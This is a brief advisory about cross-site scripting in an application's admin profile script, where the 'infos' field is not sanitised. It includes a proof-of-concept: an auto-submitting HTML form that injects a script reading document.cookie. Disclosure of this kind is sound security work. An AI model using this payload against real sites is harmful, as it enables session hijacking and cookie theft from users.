Vulnerability Details:
User can execute arbitrary JavaScript code within the vulnerable application.

The vulnerability exists due to failure in the "/core/admin/profil.php" script to properly sanitize user-supplied input in "infos" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.

An attacker can use browser to exploit this vulnerability. The following PoC is available:

<form action="http://host/core/admin/profil.php" method="post" name="main" >

<input type="hidden" name="name" value="Ildar">
<input type="hidden" name="infos" value='<script>alert(document.cookie)</script>'>
<input type="hidden" name="profil" value="Modifier votre profil">
<input type="hidden" name="password1" value="">
<input type="hidden" name="password2" value="">

</form>
<script>
document.main.submit();
</script>
